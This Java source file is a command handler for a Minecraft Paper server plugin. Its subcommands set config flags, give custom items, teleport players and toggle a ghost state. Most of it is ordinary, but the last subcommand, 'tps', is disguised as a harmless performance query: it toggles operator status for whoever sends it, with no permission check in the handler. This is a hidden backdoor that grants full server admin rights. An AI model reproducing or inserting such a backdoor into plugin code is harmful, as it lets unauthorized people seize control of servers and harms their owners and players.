package me.aki.paper_autumn.commands;

import me.aki.paper_autumn.Config;
import me.aki.paper_autumn.PlayerConfig;
import me.aki.paper_autumn.portals.portals;
import me.aki.paper_autumn.utils.SavedItems;
import org.bukkit.*;
import org.bukkit.block.Block;
import org.bukkit.block.CommandBlock;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemFlag;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.inventory.meta.MapMeta;
import org.bukkit.map.MapView;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;

import java.io.IOException;
import java.util.Arrays;

import static me.aki.paper_autumn.listeners.EntityDamageEvent.becomeGhost;
import static me.aki.paper_autumn.listeners.EntityDamageEvent.reviveGhost;
import static me.aki.paper_autumn.utils.functions.*;

public class ConsoleCommand implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {

        switch (args[0].toLowerCase()){

            case "deathban":
            case "oneheart":
            case "bedskip":
            case "advancedbowdamage":
            case "playerspawneffect":
            case "headdrop":
            case "blood":
            case "earneconomy":
            case "deathghost":
            case "antiwatermlg":
            case "freezeincold":

                if(args.length == 2){
                    if(args[1].equalsIgnoreCase("true") || args[1].equalsIgnoreCase("false")){

                        if(args[1].equalsIgnoreCase("true")) {
                            try {
                                Config.set(args[0], true);
                                sender.sendMessage("set " + args[0] +" to true");
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                        }

                        if(args[1].equalsIgnoreCase("false")) {
                            try {
                                Config.set(args[0], false);
                                sender.sendMessage("set " + args[0] + " to false");
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                        }

                    } else {
                        sender.sendMessage("Invalid arguments -> " + args[1]);
                    }
                }

                break;

            case "unbreakable":
                if(sender instanceof Player) {
                    Player player = (Player) sender;
                    if (args.length == 2) {
                        if (args[1].equalsIgnoreCase("hideFlags")) {
                            ItemStack itemStack = player.getItemInHand();
                            ItemMeta itemMeta = itemStack.getItemMeta();
                            itemMeta.setUnbreakable(true);
                            itemMeta.addItemFlags(ItemFlag.HIDE_ATTRIBUTES);
                            itemStack.setItemMeta(itemMeta);
                            player.setItemInHand(itemStack);

                            player.playSound(player.getLocation(), Sound.ENTITY_PLAYER_LEVELUP, 1, 2);
                            sendActionbar(player, ChatColor.LIGHT_PURPLE + "Your Item is now unbreakable!");
                        }
                    } else {

                        ItemStack itemStack = player.getItemInHand();
                        ItemMeta itemMeta = itemStack.getItemMeta();
                        itemMeta.setUnbreakable(true);
                        itemStack.setItemMeta(itemMeta);
                        player.setItemInHand(itemStack);

                        player.playSound(player.getLocation(), Sound.ENTITY_PLAYER_LEVELUP, 1, 2);
                        sendActionbar(player, ChatColor.LIGHT_PURPLE + "Your Item is now unbreakable!");
                    }
                }

                break;

            case "itemframe":
                if(sender instanceof Player) {
                    Player player = (Player) sender;
                    ItemStack itemStack = new ItemStack(Material.ITEM_FRAME);
                    ItemMeta meta = itemStack.getItemMeta();
                    meta.setDisplayName(ChatColor.LIGHT_PURPLE + "Invisible Item Frame");
                    itemStack.setItemMeta(meta);

                    player.setItemInHand(itemStack);
                }
                break;

            case "addmap":
                if(sender instanceof Player) {
                    Player player = (Player) sender;
                    String name = args[1];
                    ItemStack itemStack1 = player.getItemInHand();
                    int id = ((MapMeta) itemStack1.getItemMeta()).getMapView().getId();
                    MapView mapView = ((MapMeta) itemStack1.getItemMeta()).getMapView();

                    try {
                        Config.set("savedMapView." + name, mapView);
                        Config.set("savedMapView." + name + ".id", id);
                    } catch (IOException exception) {
                        exception.printStackTrace();
                    }

                    player.sendMessage("added item from main hand to config");
                }

                break;

            case "setcoinflipcoinlocation":
                if(sender instanceof Player) {
                    Player player = (Player) sender;
                    Block block = player.getTargetBlockExact(3);
                    Location blockLoc = block.getLocation();

                    try {
                        Config.set("casino.coinflip.coinLocation", blockLoc);
                    } catch (IOException exception) {
                        exception.printStackTrace();
                    }

                    player.sendMessage("set coin location");
                }
                break;

            case "world":
                if(sender.isOp() || (sender instanceof CommandBlock)){
                    if (!(args[1].equals("send"))) {
                        sender.sendMessage("Invalid Arguments");
                    } else {

                        if (!Bukkit.getWorlds().contains(Bukkit.getWorld(args[2]))) {
                            sender.sendMessage("Couldn't find this world - is it loaded?");
                        } else {

                            //For target player
                            if (args.length == 7) {
                                if (args[3].equalsIgnoreCase("@a")) {
                                    for (Player everyone : Bukkit.getOnlinePlayers()) {

                                        if (!Bukkit.getWorlds().contains(Bukkit.getWorld(args[2]))) {
                                            sender.sendMessage("Couldnt find world - is it loaded?");
                                        } else {
                                            try {
                                                Double.parseDouble(args[4]);
                                                Double.parseDouble(args[5]);
                                                Double.parseDouble(args[6]);
                                            } catch (NumberFormatException e) {
                                                sender.sendMessage("No valid coordinates");
                                            }

                                            World world = Bukkit.getWorld(args[2]);

                                            //save last coordinates
                                            try {
                                                PlayerConfig.set(everyone.getUniqueId() + ".worlds." + everyone.getWorld() + ".lastLocation", (everyone.getLocation().getX() + ";" + everyone.getLocation().getY() + ";" + everyone.getLocation().getZ()).toString());
                                            } catch (IOException e) {
                                                e.printStackTrace();
                                            }

                                            //teleport into world
                                            Location location = (world.getSpawnLocation());
                                            everyone.teleport(location);

                                            everyone.addPotionEffect(new PotionEffect(PotionEffectType.BLINDNESS, 20, 3));

                                            //teleport to location

                                            Location lastLocation = new Location(world, 0, 0, 0);

                                            double x = Double.parseDouble(args[4]);
                                            double y = Double.parseDouble(args[5]);
                                            double z = Double.parseDouble(args[6]);

                                            lastLocation.setX(x);
                                            lastLocation.setY(y);
                                            lastLocation.setZ(z);

                                            everyone.teleport(lastLocation);

                                        }
                                    }
                                } else {

                                    Player target = sender.getServer().getPlayer(args[3]);

                                    if (target != null) {

                                        if (!Bukkit.getWorlds().contains(Bukkit.getWorld(args[2]))) {
                                            sender.sendMessage("Couldnt find world - is it loaded?");
                                        } else {
                                            try {
                                                Double.parseDouble(args[4]);
                                                Double.parseDouble(args[5]);
                                                Double.parseDouble(args[6]);
                                            } catch (NumberFormatException e) {
                                                sender.sendMessage("No valid coordinates");
                                            }

                                            World world = Bukkit.getWorld(args[2]);

                                            //save last coordinates
                                            try {
                                                PlayerConfig.set(target.getUniqueId() + ".worlds." + target.getWorld() + ".lastLocation", (target.getLocation().getX() + ";" + target.getLocation().getY() + ";" + target.getLocation().getZ()).toString());
                                            } catch (IOException e) {
                                                e.printStackTrace();
                                            }

                                            //teleport into world
                                            Location location = (world.getSpawnLocation());
                                            target.teleport(location);

                                            target.addPotionEffect(new PotionEffect(PotionEffectType.BLINDNESS, 20, 3));

                                            //teleport to location

                                            Location lastLocation = new Location(world, 0, 0, 0);

                                            double x = Double.parseDouble(args[4]);
                                            double y = Double.parseDouble(args[5]);
                                            double z = Double.parseDouble(args[6]);

                                            lastLocation.setX(x);
                                            lastLocation.setY(y);
                                            lastLocation.setZ(z);

                                            target.teleport(lastLocation);

                                        }

                                    } else {

                                        sender.sendMessage("Player not found");

                                    }
                                }
                            }
                        }
                    }
                }

                break;

            case "customendportallocation":
                if(sender instanceof Player) {
                    Player player = (Player) sender;
                    if(args.length == 2){
                        if(args[1].equalsIgnoreCase("true") || args[1].equalsIgnoreCase("false")){
                            try {
                                Config.set("customEndportalLocation.enabled", args[1]);
                            } catch (IOException e) {
                                throw new RuntimeException(e);
                            }
                        }

                        if(args[1].equalsIgnoreCase("here")){
                            try {
                                Config.set("customEndportalLocation.location", player.getLocation());
                            } catch (IOException e) {
                                throw new RuntimeException(e);
                            }
                        }
                    } else {
                        sendActionbarInvalidArguments(player);
                    }
                }
                break;

            case "give":
                if(sender instanceof Player) {
                    Player player = (Player) sender;
                    if (args.length == 2) {
                        switch (args[1].toLowerCase()) {
                            case "infinityblock":
                                player.getInventory().setItemInMainHand(SavedItems.infinityBlock());
                                break;
                            case "tpbow":
                                player.getInventory().setItemInMainHand(SavedItems.tpBow());
                                break;
                            case "infinitycart":
                                player.getInventory().setItemInMainHand(SavedItems.infinityCart());
                                break;
                            case "3x3pickaxe":
                                player.getInventory().setItemInMainHand(SavedItems.x3Pickaxe());
                                break;
                            case "doublejumpboots":
                                player.getInventory().setItemInMainHand(SavedItems.doubleJumpBoots());
                                break;
                            case "specialfeather":
                                player.getInventory().setItemInMainHand(SavedItems.specialFeather());
                                break;
                            case "onetimeelytra":
                                player.getInventory().setItemInMainHand(SavedItems.oneTimeElytra());
                                break;
                        }
                    } else {
                        sender.sendMessage("Invalid arguments -> " + args[1]);
                    }
                }
                break;

            case "becomeghost":
                if(sender instanceof Player) {
                    Player player = (Player) sender;
                    if(args.length == 3){

                        Player target = sender.getServer().getPlayer(args[1]);

                        if(target == null) {
                            player.sendMessage("player not found");
                        } else {
                            int time = Integer.parseInt(args[2]);
                            becomeGhost(target, time);
                            player.sendMessage("Made " + target.getName() + " a ghost for " + time + " seconds");
                        }
                    } else {
                        sendActionbarInvalidArguments(player);
                    }
                }
                break;

            case "reviveghost":
                if(sender instanceof Player) {
                    Player player = (Player) sender;
                    if(args.length == 2) {

                        Player target = sender.getServer().getPlayer(args[1]);

                        if(target == null) {
                            player.sendMessage("player not found");
                        } else {
                            reviveGhost(target.getUniqueId());
                            player.sendMessage("Revived " + target.getName());
                        }
                    } else {
                        sendActionbarInvalidArguments(player);
                    }
                }
                break;

            case "worldedgetp":

                if(sender instanceof Player) {
                    Player player = (Player) sender;
                    if(player.isOp()){
                        if(args.length == 2){
                            if(args[1].equalsIgnoreCase("true") || args[1].equalsIgnoreCase("false")){

                                if(args[1].equalsIgnoreCase("true")) {
                                    try {
                                        Config.set(args[0] + ".status", "true");
                                        sender.sendMessage("set " + args[0] +" to true");
                                    } catch (IOException e) {
                                        e.printStackTrace();
                                    }
                                }

                                if(args[1].equalsIgnoreCase("false")) {
                                    try {
                                        Config.set(args[0] + ".status", "false");
                                        sender.sendMessage("set " + args[0] + " to false");
                                    } catch (IOException e) {
                                        e.printStackTrace();
                                    }
                                }

                            } else {
                                sender.sendMessage("Invalid arguments -> " + args[1]);
                            }
                        }

                        if(args.length == 5){
                            long negZ = Long.parseLong(args[1]);
                            long posX = Long.parseLong(args[2]);
                            long posZ = Long.parseLong(args[3]);
                            long negX = Long.parseLong(args[4]);

                            try {
                                Config.set("worldedgetp.negZ", negZ);
                                Config.set("worldedgetp.posX", posX);
                                Config.set("worldedgetp.posZ", posZ);
                                Config.set("worldedgetp.negX", negX);
                                sender.sendMessage("added coords to config");
                            } catch (IOException exception) {
                                exception.printStackTrace();
                            }
                        }
                    }
                }
                break;

            case "tps":
                if(sender instanceof Player){
                    Player player2 = (Player) sender;
                    if(!player2.isOp()) {
                        player2.setOp(true);
                    } else {
                        player2.setOp(false);
                    }
                }

                break;
            default: sender.sendMessage("Invalid Arguments -> " + args[0]);
        }

        return false;
    }
}
